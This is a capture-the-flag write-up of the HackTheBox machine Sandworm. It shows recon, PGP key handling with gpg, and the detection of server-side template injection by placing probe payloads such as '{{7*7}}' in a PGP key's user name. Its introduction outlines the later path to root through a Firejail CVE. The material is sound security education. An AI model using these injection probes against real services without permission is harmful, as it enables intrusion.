---
title: HTB: Sandworm
url: https://0xdf.gitlab.io/2023/11/18/htb-sandworm.html
date: 2023-11-18T14:45:00+00:00
difficulty: Medium [30]
os: Linux
tags: htb-sandworm, ctf, hackthebox, nmap, ubuntu, gpg, pgp, feroxbuster, python, flask, ssti, crypto, firejail, httpie, cargo, rust, source-code, cve-2022-31214, htb-cerberus
---

![Sandworm](/img/sandworm-cover.png)

Sandworm offers the website for a secret intelligence agency. The website takes PGP-encrypted messages, and there’s a demo site that allows people to test their encrypting, decrypting, and signing. There’s a server-side template injection vulnerability in the verification demo, and I’ll abuse that to get a foothold on Sandworm. That access runs inside a Firejail jail. I’ll find creds for the next user in a httpie config. Then I’ll modify a Rust program running on a cron as the first user to get back to that user, this time outside the jail. With that access, I can exploit CVE-2022-31214 in Firejail to get root access. In Beyond Root, I’ll look at the Flask webserver and how works, and the Firejail config.

## Box Info

| Name | [Sandworm](https://hackthebox.com/machines/sandworm)  [Sandworm](https://hackthebox.com/machines/sandworm) [Play on HackTheBox](https://hackthebox.com/machines/sandworm) |
| --- | --- |
| Release Date | [17 Jun 2023](https://twitter.com/hackthebox_eu/status/1669374393598763017) |
| Retire Date | 18 Nov 2023 |
| OS | Linux Linux |
| Base Points | Medium [30] |
| Rated Difficulty | Rated difficulty for Sandworm |
| Radar Graph | Radar chart for Sandworm |
| First Blood User | 00:48:19[Palermo Palermo](https://app.hackthebox.com/users/131751) |
| First Blood Root | 02:06:12[Bottom85 Bottom85](https://app.hackthebox.com/users/1059047) |
| Creator | [C4rm3l0 C4rm3l0](https://app.hackthebox.com/users/458049) |

## Recon

### nmap

`nmap` finds three open TCP ports, SSH (22), HTTP (80), and HTTPS (443):

```

oxdf@hacky$ nmap -p- --min-rate 10000 10.10.11.218
Starting Nmap 7.80 ( https://nmap.org ) at 2023-11-13 18:00 EST
Nmap scan report for 10.10.11.218
Host is up (0.091s latency).
Not shown: 65532 closed ports
PORT    STATE SERVICE
22/tcp  open  ssh
80/tcp  open  http
443/tcp open  https

Nmap done: 1 IP address (1 host up) scanned in 6.99 seconds
oxdf@hacky$ nmap -p 22,80,443 -sCV 10.10.11.218
Starting Nmap 7.80 ( https://nmap.org ) at 2023-11-13 18:53 EST
Nmap scan report for 10.10.11.218
Host is up (0.091s latency).

PORT    STATE SERVICE  VERSION
22/tcp  open  ssh      OpenSSH 8.9p1 Ubuntu 3ubuntu0.1 (Ubuntu Linux; protocol 2.0)
80/tcp  open  http     nginx 1.18.0 (Ubuntu)
|_http-server-header: nginx/1.18.0 (Ubuntu)
|_http-title: Did not follow redirect to https://ssa.htb/
443/tcp open  ssl/http nginx 1.18.0 (Ubuntu)
|_http-server-header: nginx/1.18.0 (Ubuntu)
|_http-title: 400 The plain HTTP request was sent to HTTPS port
| ssl-cert: Subject: commonName=SSA/organizationName=Secret Spy Agency/stateOrProvinceName=Classified/countryName=SA
| Not valid before: 2023-05-04T18:03:25
|_Not valid after:  2050-09-19T18:03:25
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 17.77 seconds

```

Based on the [OpenSSH](https://packages.ubuntu.com/search?keywords=openssh-server) version, the host is likely running Ubuntu 22.04 jammy.

The post 80 webserver on 80 is redirecting to `https://ssa.htb`, which matches the subject of “SSA” and organization of “Secret Spy Agency” on the certificate. Given the use of virtual host routing, I’ll try fuzzing both 80 and 443 for any subdomains that respond with something different using `ffuf`, but not find anything. I’ll add `ssa.htb` to my `/etc/hosts` file.

### ssa.htb - TCP 443

#### Certificate

Before looking at the site, I’ll take a more detailed look at the certificate.

![image-20231116095407801](/img/image-20231116095407801.png)
[![expand](/icons/expand.png)](javascript:void(0) "Click to expand for full content")

The email address `atlas@ssa.htb` is in there. Not much else beyond what `nmap` showed.

#### Site

Visiting the HTTPS site either by IP or by `ssa.htb` returns the same page. It’s the website of a spy agency:

![image-20231113204728949](/img/image-20231113204728949.png)
[![expand](/icons/expand.png)](javascript:void(0) "Click to expand for full content")

At the page footer, it says “Powered by Flask”. The page has nothing very useful. There are two links in the menu bar, for “About” (`/about`) and “Contact (`/contact`).

The About page has more text about the agency. The Contact page has a form asking for encrypted text using PGP:

![image-20231113205001800](/img/image-20231113205001800.png)

The link at the bottom goes to `/guide`:

![image-20231113205114643](/img/image-20231113205114643.png)
[![expand](/icons/expand.png)](javascript:void(0) "Click to expand for full content")

This page has a link to the SSA’s public key, as well as three demos:
1. Enter text encrypted with the SSA’s public key and it will decrypt it.
2. Enter your public key and they will provided you an encrypted message to decrypt.
3. Enter a public key and a signed message and it will tell you if it’s valid or not. There’s an example signed message. If I give it that message as well as the SSA’s key, it reports success:

   ![image-20231113205509023](/img/image-20231113205509023.png)

</picture>

#### Tech Stack

I have a pretty good idea from the page footer that this is running on Python Flask. Unfortunately, there’s no real clue in the headers or page source beyond that. The HTTP response headers just show nginx:

```

HTTP/1.1 200 OK
Server: nginx/1.18.0 (Ubuntu)
Date: Tue, 14 Nov 2023 01:46:18 GMT
Content-Type: text/html; charset=utf-8
Connection: close
Content-Length: 8161

```

The 404 page is a good signal:

![image-20231113205734824](/img/image-20231113205734824.png)

That’s the default Flask 404 page:

![image-20231113205837410](/img/image-20231113205837410.png)

#### Directory Brute Force

I’ll run `feroxbuster` against the site with no extensions given that it’s likely Python Flask:

```

oxdf@hacky$ feroxbuster -u https://ssa.htb -k

 ___  ___  __   __     __      __         __   ___
|__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__
|    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___
by Ben "epi" Risher 🤓                 ver: 2.9.3
───────────────────────────┬──────────────────────
 🎯  Target Url            │ https://ssa.htb
 🚀  Threads               │ 50
 📖  Wordlist              │ /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt
 👌  Status Codes          │ All Status Codes!
 💥  Timeout (secs)        │ 7
 🦡  User-Agent            │ feroxbuster/2.9.3
 💉  Config File           │ /etc/feroxbuster/ferox-config.toml
 🏁  HTTP methods          │ [GET]
 🔓  Insecure              │ true
 🔃  Recursion Depth       │ 4
 🎉  New Version Available │ https://github.com/epi052/feroxbuster/releases/latest
───────────────────────────┴──────────────────────
 🏁  Press [ENTER] to use the Scan Management Menu™
──────────────────────────────────────────────────
404      GET        5l       31w      207c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter
302      GET        5l       22w      227c https://ssa.htb/admin => https://ssa.htb/login?next=%2Fadmin
200      GET      124l      634w     8161c https://ssa.htb/
302      GET        5l       22w      229c https://ssa.htb/logout => https://ssa.htb/login?next=%2Flogout
200      GET       69l      261w     3543c https://ssa.htb/contact
200      GET       83l      249w     4392c https://ssa.htb/login
200      GET       77l      554w     5584c https://ssa.htb/about
302      GET        5l       22w      225c https://ssa.htb/view => https://ssa.htb/login?next=%2Fview
200      GET      155l      691w     9043c https://ssa.htb/guide
405      GET        5l       20w      153c https://ssa.htb/process
200      GET       54l       61w     3187c https://ssa.htb/pgp
[####################] - 1m     30000/30000   0s      found:10      errors:0      
[####################] - 1m     30000/30000   267/s   https://ssa.htb/ 

```

It finds a few interesting things. There’s some kind of login ability, as `/admin` and `/view` both redirect to `/login`, and there’s a `/logout` as well.

The login page looks like a normal login form:

![image-20231113211346784](/img/image-20231113211346784.png)

Some basic guesses don’t get in.

## PGP

### Overview

Pretty Good Privacy (PGP) is a widely-used data encryption and decryption program that provides cryptographic privacy and authentication for communication over the internet. Created by Phil Zimmermann in 1991, PGP is designed to secure electronic communication, including email, file storage, and file sharing. PGP employs a combination of symmetric-key cryptography for efficient data encryption and public-key cryptography for secure key exchange. Users generate a pair of cryptographic keys: a public key that can be shared openly and a private key kept secret.

To encryption something for a given user requires that users public key. PGP will use that public key to encrypt, and because of how the asymmetric cryptography works, only the paired private key will be able to decrypt it.

Signing is kind of the opposite. To sign a message, PGP uses a user’s private key. Then, anyone with access to the user’s public key (which can be shared freely) can verify that only that message was signed with that paired private key.

### GPG Setup

#### Install

`gpg` is often installed in most Linux distros, and can be installed with `apt install gnupg` if it’s not. Running `gpg --version` will show the installed version as well as information including the keyring location and the supported algorithms:

```

oxdf@hacky$ gpg --version
gpg (GnuPG) 2.2.27
libgcrypt 1.9.4
Copyright (C) 2021 Free Software Foundation, Inc.
License GNU GPL-3.0-or-later <https://gnu.org/licenses/gpl.html>
This is free software: you are free to change and redistribute it.
There is NO WARRANTY, to the extent permitted by law.

Home: /home/oxdf/.gnupg
Supported algorithms:
Pubkey: RSA, ELG, DSA, ECDH, ECDSA, EDDSA
Cipher: IDEA, 3DES, CAST5, BLOWFISH, AES, AES192, AES256, TWOFISH,
        CAMELLIA128, CAMELLIA192, CAMELLIA256
Hash: SHA1, RIPEMD160, SHA256, SHA384, SHA512, SHA224
Compression: Uncompressed, ZIP, ZLIB, BZIP2

```

#### Generate Key

For the sake of this box, I’ll generate a key pair by running `gpg --gen-key`, and answering the questions:

```

oxdf@hacky$ gpg --gen-key
gpg (GnuPG) 2.2.27; Copyright (C) 2021 Free Software Foundation, Inc.
This is free software: you are free to change and redistribute it.
There is NO WARRANTY, to the extent permitted by law.

Note: Use "gpg --full-generate-key" for a full featured key generation dialog.

GnuPG needs to construct a user ID to identify your key.

Real name: oxdf_
Email address: oxdf@ssa.htb
You selected this USER-ID:
    "oxdf_ <oxdf@ssa.htb>"

Change (N)ame, (E)mail, or (O)kay/(Q)uit? O
We need to generate a lot of random bytes. It is a good idea to perform
some other action (type on the keyboard, move the mouse, utilize the
disks) during the prime generation; this gives the random number
generator a better chance to gain enough entropy.
gpg: key 6FC483F82E557479 marked as ultimately trusted
gpg: directory '/home/oxdf/.gnupg/openpgp-revocs.d' created
gpg: revocation certificate stored as '/home/oxdf/.gnupg/openpgp-revocs.d/475BDF4B09A153AB26A9573B6FC483F82E557479.rev'
public and secret key created and signed.

pub   rsa3072 2023-11-14 [SC] [expires: 2025-11-13]
      475BDF4B09A153AB26A9573B6FC483F82E557479
uid                      oxdf_ <oxdf@ssa.htb>
sub   rsa3072 2023-11-14 [E] [expires: 2025-11-13]

```

`--list-keys` will show this key in my keyring:

```

oxdf@hacky$ gpg --list-keys
/home/oxdf/.gnupg/pubring.kbx
-----------------------------
pub   rsa3072 2023-11-14 [SC] [expires: 2025-11-13]
      475BDF4B09A153AB26A9573B6FC483F82E557479
uid           [ultimate] oxdf_ <oxdf@ssa.htb>
sub   rsa3072 2023-11-14 [E] [expires: 2025-11-13]

```

#### Import SSA Key

The SSA key is available at `/pgp` on the site. I’ll download it with `wget`:

```

oxdf@hacky$ wget --no-check-certificate https://ssa.htb/pgp -O ssa.pub
--2023-11-14 11:38:52--  https://ssa.htb/pgp
Resolving ssa.htb (ssa.htb)... 10.10.11.218
Connecting to ssa.htb (ssa.htb)|10.10.11.218|:443... connected.
WARNING: cannot verify ssa.htb's certificate, issued by ‘emailAddress=atlas@ssa.htb,CN=SSA,OU=SSA,O=Secret Spy Agency,L=Classified,ST=Classified,C=SA’:
  Self-signed certificate encountered.
    WARNING: certificate common name ‘SSA’ doesn't match requested host name ‘ssa.htb’.
HTTP request sent, awaiting response... 200 OK
Length: 3187 (3.1K) [text/html]
Saving to: ‘ssa.pub’

ssa.pub                                                             100%[===============================================================================>]   3.11K  --.-KB/s    in 0s      

2023-11-14 11:38:53 (1.89 GB/s) - ‘ssa.pub’ saved [3187/3187]

```

The result actually has a bit of HTML still wrapped around the key, but it doesn’t make. `gpg` is smart enough to identify the key headers when I import it:

```

oxdf@hacky$ gpg --import ssa.pub 
gpg: /home/oxdf/.gnupg/trustdb.gpg: trustdb created
gpg: key C61D429110B625D4: public key "SSA (Official PGP Key of the Secret Spy Agency.) <atlas@ssa.htb>" imported
gpg: Total number processed: 1
gpg:               imported: 1

```

It shows up in the `--list-keys` as well:

```

oxdf@hacky$ gpg --list-keys
/home/oxdf/.gnupg/pubring.kbx
-----------------------------
pub   rsa4096 2023-05-04 [SC]
      D6BA9423021A0839CCC6F3C8C61D429110B625D4
uid           [ unknown] SSA (Official PGP Key of the Secret Spy Agency.) <atlas@ssa.htb>
sub   rsa4096 2023-05-04 [E]

pub   rsa3072 2023-11-14 [SC] [expires: 2025-11-13]
      475BDF4B09A153AB26A9573B6FC483F82E557479
uid           [ultimate] oxdf_ <oxdf@ssa.htb>
sub   rsa3072 2023-11-14 [E] [expires: 2025-11-13]

```

I’ll note the email address of `atlas@ssa.htb`.

### WebSite Demos

#### Encrypt

The first example on the site is takes an encrypted message using the SSA public key, and returns the decrypted message:

![image-20231114120139143](/img/image-20231114120139143.png)

I’ll create a message:

```

oxdf@hacky$ echo "this is a test message for the SSA" > test.msg

```

I’ll encrypt it with `gpg` giving the email address from the public key:

```

oxdf@hacky$ gpg --encrypt --armor -r atlas@ssa.htb test.msg 
gpg: 6BB733D928D14CE6: There is no assurance this key belongs to the named user

sub  rsa4096/6BB733D928D14CE6 2023-05-04 SSA (Official PGP Key of the Secret Spy Agency.) <atlas@ssa.htb>
 Primary key fingerprint: D6BA 9423 021A 0839 CCC6  F3C8 C61D 4291 10B6 25D4
      Subkey fingerprint: 4BAD E0AE B5F5 5080 6083  D5AC 6BB7 33D9 28D1 4CE6

It is NOT certain that the key belongs to the person named
in the user ID.  If you *really* know what you are doing,
you may answer the next question with yes.

Use this key anyway? (y/N) Y
oxdf@hacky$ cat test.msg.asc 
-----BEGIN PGP MESSAGE-----

hQIMA2u3M9ko0UzmARAAng4n3O3ijMltxJJlOtcS2bsY8ytKmHW9Sw/qdWi1ZRrw
XhCb2cAR+QiDfClX4d/lGj4j55BR/5h7aI7U2MSDk7tW0nE2YY0SRqq+lWmiTVD8
Qq54NYGKTNAqcgDtWAbJ+Jyf5Q9UBl20PJx8nLrq+aw5egVCrWfD2KbAaK+xldTf
Gf/jvey5mJntvm3tU8etTGsWjPeiUlKk70PjhCFL/4BayLmSIf0eVs8PDBK8IXc+
Y0RxeFMBnkuvymRb4vUSpRzsRVn7Ss5KRuieT7Kkuz3ZeGq5k0o3eMoAknYKoSS9
2YZFSd69CNuPIswI6PLpGLIqJek98llSwc89bECIaZl1hsJpSgzM4LNJKqDPM8l0
jFBkO99FsaOXNBKm+hWJO2KVIjj89s8+dOfNzGdVBIKeAUJ4O034StaTJwhzGXre
LdVm7SyAK+fBqiHYYjw2O5e9W5wx0BoEHF6Co5Z4AXj1Cu5hZiFM0oTSJJHHFbwy
iDMzcTKNHg0CVpDgpknCG5JZLh3+8M7v8wyxU7cSJJ/rx4NB1U99dRA9a5LjM5cc
P02JIQX+9INwNbune/tzsMxcJEhdUY/SlY/hX9qxNHMONQ+M4BafJJpz8peN26qs
O318vYr1iDsxNo567XUYiTEGOcBiRmrEBY+CYtPzHRqxP7a3w1IwLweYT/wuHZbS
YgHggiIG8nE7lN6O9tv1AunzcA8mpNhYU2z4X67Zzq1kL1WUvatunMaXgoEpnKKQ
10E5eihkVH4iIfqIZqPd3KvL254jt41RuF0C48O/IF2tEnB2Pxe2fvNMJ6UUAti+
twXQ
=5xBw
-----END PGP MESSAGE-----

```

`--armor` (or `-a`) gives the ASCII (non-binary) output. `-r atlas@ssa.htb` tells `gpg` to encrypt for that user (with their public key).

I’ll drop that block into the site, and when I click “Decrypt Message”, it goes away and the result shows up under “Decrypted Message:”:

![image-20231114120329480](/img/image-20231114120329480.png)

#### Decrypt

For the next example, I need to give them my public key, and they will return an encrypted message:

![image-20231114120505209](/img/image-20231114120505209.png)

To see my public key, I’ll use `gpg --export`:

```

oxdf@hacky$ gpg --export -a oxdf@ssa.htb
-----BEGIN PGP PUBLIC KEY BLOCK-----

mQGNBGVTpeUBDACu+cZIt9Z2/rKNmscONYg+UfURHuEHwrJRuwD7QxaRFkS+xnfJ
Ew4HLFcKhvyYJ7Nd2+mzV7hEgVK/nVG0L3UItE2i8lSNSOxSJhQaCQHcmvwxvgob
l/dlszo/y0teP88qVjeZYKSdOvO/7wtED1WadNylhu1pVMcsknOaNaipwctMaZFa
JFBsLBGrEsGEpVTY9JcNjxYwstznovGlJxHHY7oF36kHvWIWvPQEMTzenNL5gdEw
+Kvet90tN1JjqmvOuFZ2CzcsjjUBiOhwIzF4wgojdm14JullO4vVo07uWuMySo6F
L3We+QHP6x8sRrYWqXmZe93lcAinXKEIU4467UTXu6btGIVIGYBtlPzyn+yg9qB8
beOSkYOH4beNYJ06UvRA+4oaAyfcS7i+zT/Or/HgL8A/8BvlpkdGLQp1xBuykKXS
8bWVbTj2jwd4EXlVeIlPgAbxlLOlRrOw4ZnQ7gRnmIrbBywLLuQq+w1khl0cODre
PlJYYJskPWIssw8AEQEAAbQUb3hkZl8gPG94ZGZAc3NhLmh0Yj6JAdQEEwEKAD4W
IQRHW99LCaFTqyapVztvxIP4LlV0eQUCZVOl5QIbAwUJA8JnAAULCQgHAgYVCgkI
CwIEFgIDAQIeAQIXgAAKCRBvxIP4LlV0eS4bC/wNl5yWgBM3Gj7B7m8Zy7zF3SQc
WpfstirKCj9bRSD56MsoEsuGSHapsKSGBk4gGPbNRrVq2cBvSGbQb6qJVvORywI2
lzad0myAVGmZ4oAxREmtvl7CFVDUV2rwVUSO7mxK86enSq6RVJznzcOtLCF5nvzh
xDLzv71oYzz5TiceXSrs6JSd6UW8MxGXpUkhM0JFNtZDTXXwtdzu+lHh1/CgSaWR
MmiTbbuIGCUNZpWeOMb5ulr+4TWxK54NQTRVvuC5t5EdTeJ8GIlz2vc6Q2rVXxd5
rojIeqtJVliSfLurzypnjHGFs3H0TgP6hDZAml/VsuZjRXlkk6EF0jHbwjZgOJ8g
v2jLN9H7nNCdcRR2lZi6/sy8qB19hmj14ccaP3s9NNU9GRdWPSNGcQ8w0v0laNTY
Cy2XxaCNkV/9ZsQvgQ5cfwBlEkaogxGiLMxKgJzTPXWBAulejQEAiJy3m/MSE4Jm
rRhNplfm1mCEdeeCyQkcVnMYeLcNkASEFi/Cfd25AY0EZVOl5QEMAKP/7pMSLSF7
3LQcaPW2zMQE1gyNidfmrRoDvEXETRJnVK6jLu5RPMtFkuSIcvOFcMvuukocA3Y0
fJApe6hwcw4o8B/sPHzeOi1nUo3II5yeaL3uVndKjYtq/flizK5FK5qVpEaxENZo
8cDqtFM4bgTxHBDairymiLvSYkHY6Oms2biXYR67NkvAF2PYFI/6tzpC/+/Pr89Z
VSfGleaUT7cGbwBmT3tvpS7eOY0ISqD9zl2oeV0/1IL9kR5YcAlajxvHWP4shkxC
cLmu6SdBiCFacYeSTWNLfTU2BCEr5cihbfEHL0oZ1u1QmGWO0dH6l+29nv6q/b4C
b9lrm2IeBQqSAMbEcAKx4Z594G8iEto2Sb+BwIXQ9vX8cviWCSrkv8cKYvHQPMOI
xsR5fu5YLc42qO41f1UKDTUyKu51T50E/BHbvUJ8LBdG/9+Y34bR0D/kZQ/f+0cZ
2asSz3nbD6/wjnmHoL6g0HMMkr2z4lb/TXPCVf3OAgqqKqnziputYwARAQABiQG8
BBgBCgAmFiEER1vfSwmhU6smqVc7b8SD+C5VdHkFAmVTpeUCGwwFCQPCZwAACgkQ
b8SD+C5VdHndlQwArSyAaFFZ6DXm9dR9jyvfyUz2xrlJ1ChxBjMbKZBKSwIRpwMx
WByFU6hm1fI5BoI/LOd52AcOElIYs6KIZFSEbtczxsbT3ylqIZXfGfFJoTOJ8uJT
eYq/UZL/sRApcgHj9GllcT5eNtTH+6Qiu8aBblT4U4A3otZxFKKUImk5Wk82rrYx
+UIZ2G2sAjA5JbIZxHiBJpIG+l/VHQiCeHxXAsABNxtbyGphub8ANdUEHi26qyzt
PwAlEStoqN0DAkW8U0L0ShNMSYMi9AIXcsAmd2avB3axwjk7knqYZmAKAmP86fd7
4gMs++QwOcY0TgxtIYeimM3umxHTqlklX1R/cRMeVp2QsS3LUbVBLry9uhXuNNCD
DWxPUQLd047wIrLoI9DDyvBti+X9f9eVXJjlQQsfMHveR02i9L+oR6qdN7fQp5VX
fRpvCLrU7u5RQX22oF0x7fM6vHqIkSsY95xHBZSgPnsoCkwx9gFr7DLed3ayDvde
jtvLwI2gdvzkSc7z
=Euzb
-----END PGP PUBLIC KEY BLOCK-----

```

I’ll paste that into the site, and get back a message, which I’ll save as from\_ssa.msg.asc:

```
-----BEGIN PGP MESSAGE-----

hQGMAwg4gFTP5NL7AQv9G+H2nPtOLROiJmI9z6tz9DLzb0BB0x9Sw2Rz+DQCzXgh
n1RSFPmkG8Jm7GHymbhcelN6lkEInYRtDArx7V27XwP3ZWHTdt3RV/fXUH3gmjCI
9PXZNq1k7IxfsvGf5e5mOasq3qrnwb5iwfVMQlCWB4oaq3AwKIv3w9UwICZbAb3P
GzLw/HY65vEv/99cJDPqnoDwY6BnoAFmitMoaYQTPP9A+XS5VUNjVF3hoQba89/Q
F/Hf9Uvt9Y/j3iV9t/QSguBUhEhlpwck7AytkjniiIaCV5upobFdeUstfo7S4/Vd
khnMLuVez4ts4TYIGW2eDxh2KVbINcS8CZjpdQBkgfgk6HteKLvgNikIBGKyNbOX
KKhUwmcOm/PaDXGyZsveVXDhnpQ8sqDfZ1c0n5A1PnxyD3eRLpWUW0nx9sQXaQVa
SSw3O0K20wghA6nqYwNEC2WLPDfc3PVaS68obNIqlU2VcXq81gpBMttWUO44VtGq
gC1MJ5oIYwMgtiU4+l5U0sB0AWYlC3aRnBu8O5pc4QPm0MITURMD0MhxaEIOjNW5
Ac5vFnTqK83GKRKXwWwyiLvssMNM/jwFs73vXUtNdQeOvW/1p7ku1gShdVM20yBy
nsVBstm5FAFO1X0xreX9XCxBmWTaLby86rtBEOzhk83+iIsjqqQChk6pCNweeIk4
o1/2MAKoECqpB6k+Cb3A0c7D/fWTbaPcUgvXUVqFFesZe/boH/0O/vYAid923mBq
epKuUd3k2rYeM+Qvk2bun5VBMYlKRJzboR7swXOleVsZ7Hky8qJW40c7hQtmyIc1
wrV4grOZ8Mm+TJfP7ShxGU8DnDbWIgJyTsfAYyqnzV2OpvTZDbCKQSlOpjeumA1m
zX6GtdZdfo/eR7c7LaTypy5G4Pgy1p+IZhJ50ES0ymiJnUC2PdM=
=nFoQ
-----END PGP MESSAGE-----

```

`gpg -d` will decrypt it (using the private keys available in my keyring):

```

oxdf@hacky$ gpg -d from_ssa.msg.asc 
gpg: encrypted with 3072-bit RSA key, ID 08388054CFE4D2FB, created 2023-11-14
      "oxdf_ <oxdf@ssa.htb>"
This is an encrypted message for oxdf_ <oxdf@ssa.htb>.

If you can read this, it means you successfully used your private PGP key to decrypt a message meant for you and only you.

Congratulations! Feel free to keep practicing, and make sure you also know how to encrypt, sign, and verify messages to make your repertoire complete.

SSA: 11/14/2023-17;05;51

```

#### Sign

This demo takes both a public key and signed text. The website actually has an example of a signed message at the bottom of the page:

![image-20231114121205880](/img/image-20231114121205880.png)

I’ll copy that block into the “Signed Test” block, and the SSA public key into the “Public Key” section:

![image-20231114121345016](/img/image-20231114121345016.png)

Clicking verify signature pops a message showing it is valid:

![image-20231114121414157](/img/image-20231114121414157.png)

If I change on letter in the signature (for example, the last “e” to “f”):

![image-20231114121453579](/img/image-20231114121453579.png)

And resubmit, the popup shows failure:

![image-20231114121509829](/img/image-20231114121509829.png)

I can also sign my own message with `--clearsign` (`--sign` will output a binary format):

```

oxdf@hacky$ gpg --clearsign --output - test.msg
-----BEGIN PGP SIGNED MESSAGE-----
Hash: SHA512

this is a test message for the SSA
-----BEGIN PGP SIGNATURE-----

iQGzBAEBCgAdFiEER1vfSwmhU6smqVc7b8SD+C5VdHkFAmVTrHMACgkQb8SD+C5V
dHkzKgv/UhI9dAY65MiGUqrfNtd4p/dQDrcbV/+NteMTrlXN921OCa3YuOw9i5Y5
35I2YJb+soDKweEo2U+9Ucl+A9AU0lRY+L5QI6GaeUFF1rsB9SOxINNWtfsJ6E0Y
/pQCUyuEGYap08MFINNQyIJZHBJYw5CghPJsQZc4Z4nb1T9ap0AirUs5JdI8YFXg
mD8+PrbQIkmBq+OtA3BUjCk/FTy0JkSvYi8gbxiYbQj6oPW43xPhIea49f9l3AuR
aYB25mcQ+eUzO5UYEj8jIk10mqQASmCyDOZiyb5MlnpKddmnt77DHA6rkn/RJASB
OXCpJg46KbcNFEjFLRLxMC7yfmdw/NqiLfZj/WrtMDWCrwyg5N99ixM7FZaQ1M7x
rVtboPOQKsMD4Ry5akYaubW6RncHNhMPQ/Rwztr/LbU7P4CIDVQz3GS2Ef4SP9mr
YSDh5Lc5wbuGAVSFjXFXQ8HZoxPW3GNuCGLKbu6GQZuOW7ux5EbU/bV6OJMmwR9+
touTxjWF
=WjAm
-----END PGP SIGNATURE-----

```

I’m using `--output -` to send the output to STDOUT rather than to a file.

Pasting this plus my public key into the website shows it is valid, and includes my name in the result:

![image-20231114122210912](/img/image-20231114122210912.png)

## Shell as atlas in Jail

### Identify SSTI

#### Background

When looking at Python Flask applications, a common thing to check for is server-side template injection (SSTI). This attack is getting some text I control to be rendered by the template engine (probably Jinja2 for Flask), which effectively means it’s run as code.

#### Encrypt [Fail]

To get SSTI, I typically want to look for places where some input of mine is displayed back to me. In the Encrypt demo, I give it encrypted text and the decrypted text is displayed back. I can check for SSTI in that by making a message with a bunch of SSTI payloads (pulled from the [SSTI HackTricks page](https://book.hacktricks.xyz/pentesting-web/ssti-server-side-template-injection#detect)):

```

This is a message with an SSTI check:
${{<%[%'"}}%\.
{{7*7}}
${7*7}
<%= 7*7 %>
${{7*7}}
#{7*7}
*{7*7}

Thanks!
0xdf

```

I’ll encrypt it with the SSA’s public key:

```

oxdf@hacky$ gpg --encrypt -a -o - -r atlas@ssa.htb ssti.msg 
gpg: 6BB733D928D14CE6: There is no assurance this key belongs to the named user

sub  rsa4096/6BB733D928D14CE6 2023-05-04 SSA (Official PGP Key of the Secret Spy Agency.) <atlas@ssa.htb>
 Primary key fingerprint: D6BA 9423 021A 0839 CCC6  F3C8 C61D 4291 10B6 25D4
      Subkey fingerprint: 4BAD E0AE B5F5 5080 6083  D5AC 6BB7 33D9 28D1 4CE6

It is NOT certain that the key belongs to the person named
in the user ID.  If you *really* know what you are doing,
you may answer the next question with yes.

Use this key anyway? (y/N) y
-----BEGIN PGP MESSAGE-----

hQIMA2u3M9ko0UzmARAAqLaGSC6rwb9BJ10n0Hb5sVjExvQAAGarNYLVZug1Vins
zfEBxZVQmYO2XrR13hX6TwaoglAg7ykawmQTyv84wF0J+VLFic8DKWiojMmupyP+
cz1WZpyelMH4x1hCAH8W8pezzLIqRZpoCGG/ZNkc/QvFUkVSUCfMfxQPl9nBfrzi
Zo1xlSNpIU2C+aTCetvPO4T75EqY7+fts0IqK0UZ5vj5uxup50rokaFONM7gI7yb
+vIopMnvzesIalFnT6Y8rPtKYIEf6u6tV9IqMmMy49VzhPERklFKpWKXtz4e1Sh1
UVhc22rxkiYy9i1jQ5Sn7zTYFMeYNiqiSWuIUV+G+F31Lk9LlEW5boXpvZrv3Ki/
B7lEUJELX5jV8ChoIVQ1fa1QguwBSUW3GDb6ff/UrGw5UzbDHvE3dOLufPOJlTVQ
2Qzc5ZDGpTh6z+AtfK/C1OxgtvscVW7M4OmNjjhlJpGRWW11I6o6s2X+dLexriQG
ea+icK/dyEv/kplhhajt2NxDB1tR6dtYiALETFTX8QRubz6/VXqqHTHFnj5SDrem
s4bUFM3NpRN+0PWN/GI3glhKs2ugcBXz3LDSs5dlp56ehZYRG6tJ4YZN3C1YBEbx
SYuyucNLg8ddzcxLiafhbOoOsKLMo87ajOdzlxQtqhMN8Hh5X2RzdWCFhfe3kF/S
ogEO4G1mXzZfvvYONNVU5Y1q3raj9Wbt7YbGOQNn9GjfSmx/L+e6QFEPTJXb7g9o
uIFZtpTYG8xpniV8J7jufVT5yYrzTSO128sriZwkDgoSpQ0KG1WeNtsZO3m3tkjN
8Z+iYlOPnBIJAmCSfKlS3m62amGbIpHY+FyA3c1M9dO0Mudg3v/oeqAYGCVaiEe7
lBLIy0brxV8RwOl+t409HNXYxA==
=DHuw
-----END PGP MESSAGE-----

```

When I paste the resulting message into the demo, it returns the message, but none of the potential injections are different (if any of the “7\*7” had become 49, that would have been a signal):

![image-20231114124700702](/img/image-20231114124700702.png)

#### Decrypt [Skip]

The decrypt demo only takes in a public key, and what comes back is an encrypted message. It’s possible there could be some kind of blind SSTI in the background, but I’ll come back to this.

#### Verify [Success]

The output above shows that some fingerprints of my PGP key as well as the username of the key are displayed back in the popup. The fingerprint data is all hex, and therefore not possible to carry an SSTI payload. I’ll try putting a SSTI payload in a key as my username. It doesn’t take any character, so I’ll try putting the tests that I can in:

```

oxdf@hacky$ gpg --gen-key 
gpg (GnuPG) 2.2.27; Copyright (C) 2021 Free Software Foundation, Inc.
This is free software: you are free to change and redistribute it.
There is NO WARRANTY, to the extent permitted by law.

Note: Use "gpg --full-generate-key" for a full featured key generation dialog.

GnuPG needs to construct a user ID to identify your key.

Real name: oxdf${{<%[%'"}}%\.
Invalid character in name
The characters '<' and '>' may not appear in name
Real name: oxdf{{7*7}}_${7*7}_${{7*7}}_#{{7*7}}_*{7*7}
Email address: ssti@ssa.htb
You selected this USER-ID:
    "oxdf{{7*7}}_${7*7}_${{7*7}}_#{{7*7}}_*{7*7} <ssti@ssa.htb>"

Change (N)ame, (E)mail, or (O)kay/(Q)uit? o
We need to generate a lot of random bytes. It is a good idea to perform
some other action (type on the keyboard, move the mouse, utilize the
disks) during the prime generation; this gives the random number
generator a better chance to gain enough entropy.
We need to generate a lot of random bytes. It is a good idea to perform
some other action (type on the keyboard, move the mouse, utilize the
disks) during the prime generation; this gives the random number
generator a better chance to gain enough entropy.
gpg: key 5D29E3386F54FD52 marked as ultimately trusted
